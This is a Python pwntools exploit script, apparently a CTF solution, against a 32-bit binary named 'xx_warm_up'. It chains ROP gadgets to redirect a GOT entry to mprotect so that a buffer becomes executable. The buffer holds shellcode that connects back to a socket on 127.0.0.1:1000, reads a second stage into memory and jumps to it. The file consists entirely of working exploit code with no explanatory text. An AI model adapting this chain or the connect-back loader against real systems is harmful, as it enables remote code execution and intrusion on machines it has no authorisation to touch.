#!/usr/bin/env python
# coding=utf-8
from pwn import *
elf=ELF("./xx_warm_up")
libc=ELF("/lib/i386-linux-gnu/libc.so.6")
context.arch="i386"
popal_ret=0x080485b6
'''
0x08048436: add dword ptr [ebx + 0x453bfc45], ecx;
adc byte ptr [esi - 0x70], bh; 
leave; ret; 
'''
add_leave_ret=0x08048436
buf_addr=0x804A040
rop_addr=buf_addr+64
#64 byte

libc_start_main_plt=elf.plt["__libc_start_main"]
mprotect_offset=libc.symbols["mprotect"]
libc_start_main_offset=libc.symbols["__libc_start_main"]
offset=mprotect_offset-libc_start_main_offset
libc_start_main_got=elf.got["__libc_start_main"]

payload=""
payload+=p32(rop_addr+8)# saved ecx
payload+=p32(popal_ret)
payload+=p32(0)#edi
payload+=p32(buf_addr+0x200)#esi
payload+=p32(rop_addr+40)#ebp
payload+=p32(0)#no use
payload+=p32(libc_start_main_got-0x453bfc45+0x100000000)#ebx
payload+=p32(0)#edx
payload+=p32(offset)#ecx
payload+=p32(0)#eax

payload+=p32(add_leave_ret)
payload+=p32(libc_start_main_plt)
payload+=p32(buf_addr)#ret_addr ==> shellcode
payload+=p32(buf_addr&0xfffff000)
payload+=p32(0x2000)
payload+=p32(7)

shellcode='''
xor ebx,ebx
mul ebx
push ebx
inc ebx
push ebx
push 2
mov ecx, esp
mov al, SYS_socketcall ;// SYS_socketcall
int 0x80

mov ebx,eax
xor ecx,ecx
mov al,SYS_dup2
int 0x80

push 0x0100007f
push 0xe8030002
mov edx, esp
push 0x10
push edx
push ebx
mov ecx, esp
mov eax,SYS_socketcall
int 0x80

mov ecx, 0x804a000
mov dl, 255
mov al, 3
int 0x80;//read

jmp ecx

'''
payload=asm(shellcode).ljust(64,'A')+payload

payload=payload.encode("hex")
print payload

argv=["./xx_warm_up",payload]

a=process(argv=argv)
a.interactive()